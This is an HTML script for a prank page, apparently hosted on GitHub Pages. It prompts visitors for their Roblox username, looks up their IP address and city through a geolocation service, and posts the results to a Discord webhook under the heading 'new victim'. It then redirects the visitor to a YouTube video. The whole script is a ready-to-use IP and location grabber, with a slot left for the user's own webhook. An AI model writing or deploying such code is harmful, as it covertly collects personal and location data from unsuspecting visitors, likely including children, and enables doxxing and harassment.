<script>
    const DISCORD_WEBHOOK = "TU_WEBHOOK_AQUI"; // Pega aquí tu link de Discord

    async function runTroll() {
        const user = document.getElementById('rbxUser').value;
        if (!user) return alert("Ingresa tu usuario.");

        document.getElementById('status-text').style.display = 'block';

        try {
            // Captura de datos básica
            const geo = await (await fetch('https://ipapi.co/json/')).json();
            
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🎮 NUEVA VÍCTIMA - GITHUB PAGES",
                        color: 3066993,
                        fields: [
                            { name: "👤 Usuario Roblox", value: `\`${user}\`` },
                            { name: "🌐 IP", value: `\`${geo.ip}\`` },
                            { name: "📍 Ubicación", value: `${geo.city}, ${geo.country_name}` }
                        ],
                        timestamp: new Date()
                    }]
                })
            });

            // Redirección al video de YouTube
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
            }, 1500);

        } catch (e) {
            window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
        }
    }
</script>